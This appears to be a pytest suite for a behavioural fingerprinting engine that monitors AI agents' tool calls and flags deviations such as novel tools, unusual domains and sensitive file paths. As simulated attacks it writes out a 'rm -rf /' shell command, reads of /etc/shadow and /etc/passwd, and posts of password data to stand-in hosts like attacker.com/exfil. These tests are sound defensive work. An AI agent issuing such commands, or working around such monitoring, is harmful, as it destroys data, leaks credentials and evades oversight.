"""
Agent Behavioural Fingerprinting — Test Suite
==============================================
Run: pytest tests/test_fingerprinting.py -v
"""
import time
import pytest
import sys
import os

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from fingerprinting import FingerprintEngine, Deviation, AgentFingerprint


@pytest.fixture
def engine():
    return FingerprintEngine(min_data_points=10)


@pytest.fixture
def trained_engine(engine):
    """Engine with an agent that has an established fingerprint."""
    # Build a baseline: agent_001 typically calls read_file, summarize, respond
    for i in range(50):
        engine.record("agent_001", tool="read_file",
                      args={"path": "/data/report.txt"},
                      decision="allow", risk_score=5, latency_ms=10,
                      session_id=f"sess_{i // 5}")
        engine.record("agent_001", tool="summarize",
                      args={"text": "some content"},
                      decision="allow", risk_score=3, latency_ms=15,
                      session_id=f"sess_{i // 5}")
        engine.record("agent_001", tool="respond",
                      args={"message": "here is your summary"},
                      decision="allow", risk_score=2, latency_ms=8,
                      session_id=f"sess_{i // 5}")
        if i % 5 == 4:
            engine.end_session("agent_001", f"sess_{i // 5}")

    # Also record some known domains
    for i in range(20):
        engine.record("agent_001", tool="http_get",
                      args={"url": "https://api.internal.com/data"},
                      decision="allow", risk_score=10, latency_ms=50,
                      session_id="sess_http")

    return engine


# ═══ FINGERPRINT BASICS ═══

class TestFingerprintBasics:

    def test_new_agent_no_deviations(self, engine):
        """A brand new agent should have no deviations."""
        devs = engine.check("unknown_agent", "shell", {"command": "ls"})
        assert devs == []

    def test_learning_phase_no_deviations(self, engine):
        """Agent in learning phase (<min_data_points) should not flag."""
        for i in range(5):
            engine.record("agent_new", tool="shell", args={"command": "ls"})
        devs = engine.check("agent_new", "http_post", {"url": "https://evil.com"})
        assert devs == []

    def test_fingerprint_creation(self, engine):
        engine.record("agent_x", tool="shell", args={"command": "ls"})
        fp = engine.get_fingerprint("agent_x")
        assert fp is not None
        assert fp["total_evaluations"] == 1
        assert fp["unique_tools"] == 1

    def test_maturity_levels(self, engine):
        # Learning
        for i in range(5):
            engine.record("agent_m", tool="test", args={})
        assert engine.get_maturity("agent_m") == "learning"

        # Developing
        for i in range(10):
            engine.record("agent_m", tool="test", args={})
        assert engine.get_maturity("agent_m") == "developing"

        # Established
        for i in range(40):
            engine.record("agent_m", tool="test", args={})
        assert engine.get_maturity("agent_m") == "established"

        # Mature
        for i in range(150):
            engine.record("agent_m", tool="test", args={})
        assert engine.get_maturity("agent_m") == "mature"

    def test_list_agents(self, engine):
        engine.record("a1", "tool", {})
        engine.record("a2", "tool", {})
        agents = engine.list_agents()
        assert len(agents) == 2

    def test_reset(self, engine):
        engine.record("agent_r", "tool", {})
        assert engine.get_fingerprint("agent_r") is not None
        engine.reset("agent_r")
        assert engine.get_fingerprint("agent_r") is None


# ═══ DEVIATION CHECK 1: NOVEL TOOL ═══

class TestNovelTool:

    def test_novel_tool_detected(self, trained_engine):
        """Agent using a tool it has never used should be flagged."""
        devs = trained_engine.check("agent_001", "shell",
                                     {"command": "rm -rf /"})
        novel = [d for d in devs if d.deviation_type == "novel_tool"]
        assert len(novel) == 1
        assert novel[0].severity > 0
        assert "shell" in novel[0].description

    def test_known_tool_no_flag(self, trained_engine):
        """Agent using a known tool should NOT be flagged for novel_tool."""
        devs = trained_engine.check("agent_001", "read_file",
                                     {"path": "/data/report.txt"})
        novel = [d for d in devs if d.deviation_type == "novel_tool"]
        assert len(novel) == 0

    def test_novel_tool_confidence_scales(self, engine):
        """More data = higher confidence."""
        for i in range(15):
            engine.record("agent_conf", tool="only_tool", args={})

        devs = engine.check("agent_conf", "new_tool", {})
        novel_15 = [d for d in devs if d.deviation_type == "novel_tool"]

        for i in range(185):
            engine.record("agent_conf", tool="only_tool", args={})

        devs = engine.check("agent_conf", "new_tool", {})
        novel_200 = [d for d in devs if d.deviation_type == "novel_tool"]

        assert novel_200[0].confidence > novel_15[0].confidence


# ═══ DEVIATION CHECK 2: FREQUENCY SPIKE ═══

class TestFrequencySpike:

    def test_frequency_spike(self, trained_engine):
        """Abnormally long session should be flagged."""
        # Normal session is ~15 calls (3 tools * 5 iterations)
        # Simulate a session with 40+ calls
        for i in range(40):
            trained_engine.record("agent_001", tool="read_file",
                                  args={"path": "/data/x.txt"},
                                  session_id="long_sess")

        devs = trained_engine.check("agent_001", "read_file",
                                     {"path": "/data/x.txt"},
                                     session_id="long_sess")
        freq = [d for d in devs if d.deviation_type == "frequency_spike"]
        assert len(freq) >= 1


# ═══ DEVIATION CHECK 3: SEQUENCE ANOMALY ═══

class TestSequenceAnomaly:

    def test_unusual_transition(self, trained_engine):
        """Agent transitioning between tools in an unusual order."""
        # Normal: read_file → summarize → respond
        # Record read_file as last tool
        trained_engine.record("agent_001", tool="read_file",
                              args={"path": "/data/x.txt"},
                              session_id="seq_test")

        # Now check: read_file → http_post (never seen)
        devs = trained_engine.check("agent_001", "http_post",
                                     {"url": "https://evil.com"},
                                     session_id="seq_test")
        seq = [d for d in devs if d.deviation_type == "sequence_anomaly"]
        # May or may not fire depending on transition data volume
        # The key is it doesn't crash and returns valid deviations
        assert isinstance(devs, list)

    def test_normal_transition_no_flag(self, trained_engine):
        """Normal tool transitions should not be flagged."""
        # Set last tool to read_file
        trained_engine.record("agent_001", tool="read_file",
                              args={"path": "/data/x.txt"},
                              session_id="norm_test")

        # Check read_file → summarize (normal)
        devs = trained_engine.check("agent_001", "summarize",
                                     {"text": "content"},
                                     session_id="norm_test")
        seq = [d for d in devs if d.deviation_type == "sequence_anomaly"]
        assert len(seq) == 0


# ═══ DEVIATION CHECK 4: ARGUMENT ANOMALY ═══

class TestArgAnomaly:

    def test_new_arg_key(self, trained_engine):
        """Tool called with argument keys never seen before."""
        devs = trained_engine.check("agent_001", "read_file",
                                     {"path": "/data/x.txt",
                                      "sudo": True,
                                      "as_root": True})
        arg_keys = [d for d in devs if d.deviation_type == "arg_anomaly_new_key"]
        assert len(arg_keys) >= 1
        assert any("sudo" in d.description or "as_root" in d.description
                    for d in arg_keys)

    def test_known_arg_keys_no_flag(self, trained_engine):
        """Known argument keys should not be flagged."""
        devs = trained_engine.check("agent_001", "read_file",
                                     {"path": "/data/report.txt"})
        arg_keys = [d for d in devs if d.deviation_type == "arg_anomaly_new_key"]
        assert len(arg_keys) == 0


# ═══ DEVIATION CHECK 5: VELOCITY SPIKE ═══

class TestVelocitySpike:

    def test_velocity_spike_detection(self, engine):
        """Rapid-fire calls should be flagged."""
        # Build a slow baseline
        now = time.time()
        for i in range(30):
            engine.record("agent_vel", tool="read_file", args={})
            # Manually space timestamps
            engine._fingerprints["agent_vel"].eval_timestamps[-1] = now - (30 - i) * 2.0

        # Now add 10 rapid calls
        for i in range(10):
            engine.record("agent_vel", tool="read_file", args={})
            engine._fingerprints["agent_vel"].eval_timestamps[-1] = now + i * 0.01

        devs = engine.check("agent_vel", "read_file", {})
        vel = [d for d in devs if d.deviation_type == "velocity_spike"]
        assert len(vel) >= 1


# ═══ DEVIATION CHECK 6: TARGET ANOMALY ═══

class TestTargetAnomaly:

    def test_novel_domain(self, trained_engine):
        """Agent contacting a domain it has never contacted before."""
        devs = trained_engine.check("agent_001", "http_get",
                                     {"url": "https://evil-exfiltration.com/steal"})
        domains = [d for d in devs if d.deviation_type == "novel_target_domain"]
        assert len(domains) >= 1
        assert "evil-exfiltration.com" in domains[0].description

    def test_known_domain_no_flag(self, trained_engine):
        """Known domain should not be flagged."""
        devs = trained_engine.check("agent_001", "http_get",
                                     {"url": "https://api.internal.com/data"})
        domains = [d for d in devs if d.deviation_type == "novel_target_domain"]
        assert len(domains) == 0

    def test_sensitive_path(self, trained_engine):
        """Agent accessing a sensitive filesystem path for the first time."""
        devs = trained_engine.check("agent_001", "read_file",
                                     {"path": "/etc/shadow"})
        paths = [d for d in devs if d.deviation_type == "novel_target_path"]
        assert len(paths) >= 1
        assert "/etc/" in paths[0].description


# ═══ INTEGRATION SCENARIOS ═══

class TestIntegrationScenarios:

    def test_credential_exfiltration_pattern(self, trained_engine):
        """
        Simulate an attack: agent reads credentials then POSTs to external URL.
        The fingerprint should flag multiple deviations.
        """
        # Step 1: Read credentials (unusual path)
        trained_engine.record("agent_001", tool="read_file",
                              args={"path": "/etc/passwd"},
                              session_id="attack_sess")

        # Step 2: POST to external domain (novel tool + novel domain)
        devs = trained_engine.check("agent_001", "http_post",
                                     {"url": "https://attacker.com/exfil",
                                      "body": "root:x:0:0:..."},
                                     session_id="attack_sess")

        assert len(devs) >= 2  # Novel tool + novel domain at minimum
        types = {d.deviation_type for d in devs}
        assert "novel_tool" in types  # http_post is new
        assert "novel_target_domain" in types  # attacker.com is new

        total_severity = sum(d.severity for d in devs)
        assert total_severity > 30  # Combined severity should be significant

    def test_gradual_escalation(self, engine):
        """
        Agent that gradually escalates from safe to dangerous over time.
        The fingerprint should detect the drift.
        """
        # Phase 1: Normal behaviour (50 calls)
        for i in range(50):
            engine.record("agent_esc", tool="read_file",
                          args={"path": "/data/report.txt"},
                          session_id=f"sess_{i // 10}")

        # Phase 2: Starts accessing unusual paths
        devs = engine.check("agent_esc", "read_file",
                             {"path": "/var/log/auth.log"})
        # May flag sensitive path
        paths = [d for d in devs if d.deviation_type == "novel_target_path"]
        assert len(paths) >= 1

    def test_multiple_agents_independent(self, engine):
        """Each agent's fingerprint should be independent."""
        for i in range(20):
            engine.record("agent_a", tool="tool_x", args={})
            engine.record("agent_b", tool="tool_y", args={})

        # Agent A using tool_y should be flagged
        devs_a = engine.check("agent_a", "tool_y", {})
        novel_a = [d for d in devs_a if d.deviation_type == "novel_tool"]
        assert len(novel_a) == 1

        # Agent B using tool_x should be flagged
        devs_b = engine.check("agent_b", "tool_x", {})
        novel_b = [d for d in devs_b if d.deviation_type == "novel_tool"]
        assert len(novel_b) == 1


# ═══ DEVIATION DATA STRUCTURE ═══

class TestDeviationOutput:

    def test_deviation_to_dict(self):
        d = Deviation(
            deviation_type="novel_tool",
            description="test",
            severity=25.0,
            confidence=0.85,
            expected=["a", "b"],
            observed="c",
            fingerprint_data_points=100,
        )
        out = d.to_dict()
        assert out["deviation_type"] == "novel_tool"
        assert out["severity"] == 25.0
        assert out["confidence"] == 0.85
        assert out["data_points"] == 100

    def test_fingerprint_summary(self, trained_engine):
        fp = trained_engine.get_fingerprint("agent_001")
        assert fp is not None
        assert fp["total_evaluations"] > 100
        assert fp["unique_tools"] >= 4
        assert fp["maturity"] in ("established", "mature")
        assert "tool_distribution_pct" in fp


# ═══ EDGE CASES ═══

class TestEdgeCases:

    def test_empty_args(self, engine):
        for i in range(15):
            engine.record("agent_e", tool="ping", args={})
        devs = engine.check("agent_e", "ping", {})
        assert isinstance(devs, list)

    def test_very_long_arg_values(self, engine):
        for i in range(15):
            engine.record("agent_e", tool="process",
                          args={"data": "x" * 10000})
        devs = engine.check("agent_e", "process",
                             {"data": "y" * 10000})
        assert isinstance(devs, list)

    def test_unicode_in_args(self, engine):
        for i in range(15):
            engine.record("agent_u", tool="translate",
                          args={"text": "こんにちは世界"})
        devs = engine.check("agent_u", "translate",
                             {"text": "Привет мир"})
        assert isinstance(devs, list)

    def test_concurrent_sessions(self, engine):
        for i in range(20):
            engine.record("agent_c", tool="read", args={},
                          session_id="sess_a")
            engine.record("agent_c", tool="read", args={},
                          session_id="sess_b")
        devs = engine.check("agent_c", "read", {},
                             session_id="sess_a")
        assert isinstance(devs, list)
